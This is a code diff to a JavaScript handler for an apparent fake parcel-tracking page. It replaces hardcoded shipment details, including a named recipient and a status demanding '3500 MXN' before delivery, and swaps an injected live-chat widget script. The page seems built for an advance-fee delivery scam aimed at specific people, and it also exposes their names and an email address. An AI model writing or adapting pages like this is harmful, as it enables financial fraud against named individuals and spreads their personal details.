@@ -1,10 +1,10 @@
 function handle34919110LXVN(resultElement) {
     let result = {
-        sender: 'oliver hooke',
-        country: 'Dubai',
-        receiver: 'Tania lirian',
-        date: 'Aug 16, 2025',
-        location: 'On transit - waiting for payment to deliver package to home address- pending payment 500 sol'
+        sender: 'James Elijah',
+        country: 'United kindom',
+        receiver: 'Liliana Zulamith Fontes Tapia',
+        date: 'Sept 03, 2025',
+        location: 'On transit - waiting for payment to deliver package to home address- pending payment 3500 MXN'
     };
 
     // Display the result
@@ -18,7 +18,7 @@ function handle34919110LXVN(resultElement) {
 
     // Inject the LiveChat script danielpannet12@gmail.com
     const livechatScript = document.createElement('script');
-    livechatScript.src = "//code.tidio.co/db9qna6kduweptrewltxrvcsgs5osquu.js";
+    livechatScript.src = "code.tidio.co/jp7tntk5wztekymwyini3zgxr8abyc5w.js";
     livechatScript.async = true;
     document.body.appendChild(livechatScript);
 }
